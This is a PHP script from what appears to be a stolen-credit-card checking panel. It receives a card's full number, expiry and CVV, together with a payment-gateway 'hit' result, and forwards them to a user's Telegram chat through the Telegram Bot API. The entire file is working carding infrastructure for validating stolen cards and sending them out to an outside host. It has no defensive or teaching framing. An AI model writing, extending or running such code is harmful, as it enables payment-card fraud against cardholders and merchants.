<?php
// Send hit result to the user who made the check (private)
require_once '../includes/config.php';

$data = json_decode(file_get_contents('php://input'), true);
$card = $data['card'] ?? '';
$gateway = $data['gateway'] ?? '';
$status = $data['status'] ?? '';
$message = $data['message'] ?? '';
$username = $data['username'] ?? '';

$settings = loadSettings();
$botToken = $settings['telegram_bot_token'] ?? '';

if (empty($botToken)) {
    exit;
}

// Get user's telegram ID
$db = getMongoDB();
if (!$db) return;

$user = $db->users->findOne(['username' => $username]);
if (!$user || empty($user['telegram_id'])) return;

// Parse card details
$cardParts = explode('|', $card);
$cardNumber = $cardParts[0] ?? '';
$cardMonth = $cardParts[1] ?? '';
$cardYear = $cardParts[2] ?? '';
$cardCvv = $cardParts[3] ?? '';

$userMessage = "═══════════════════════════════\n";
$userMessage .= "YOUR CHECK RESULT\n";
$userMessage .= "═══════════════════════════════\n\n";
$userMessage .= "CC: {$cardNumber}|{$cardMonth}|{$cardYear}|{$cardCvv}\n";
$userMessage .= "Gateway: {$gateway}\n";
$userMessage .= "Status: {$status}\n";
$userMessage .= "Response: {$message}\n";
$userMessage .= "Time: " . date('Y-m-d H:i:s') . " UTC\n\n";
$userMessage .= "═══════════════════════════════";

sendTelegramMessage($botToken, $user['telegram_id'], $userMessage);

function sendTelegramMessage($botToken, $chatId, $message) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
        'chat_id' => $chatId,
        'text' => $message
    ]));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_exec($ch);
    curl_close($ch);
}
?>
